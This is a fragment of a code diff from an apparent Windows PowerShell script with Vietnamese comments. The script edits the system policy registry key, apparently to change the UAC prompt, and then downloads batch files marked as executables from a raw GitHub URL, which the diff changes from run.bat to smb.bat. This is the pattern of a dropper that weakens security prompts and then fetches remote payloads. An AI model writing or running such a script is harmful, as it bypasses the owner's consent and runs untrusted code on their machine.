@@ -3,7 +3,7 @@ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v Prompt
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 # Danh sách URL chứa file thực thi
 $URLs = @(
-    'https://raw.githubusercontent.com/mitutina/mitutina/main/run.bat'
+    'https://raw.githubusercontent.com/mitutina/mitutina/main/smb.bat'
 )
 # Tải nội dung từ URL
 foreach ($URL in $URLs | Sort-Object { Get-Random }) {
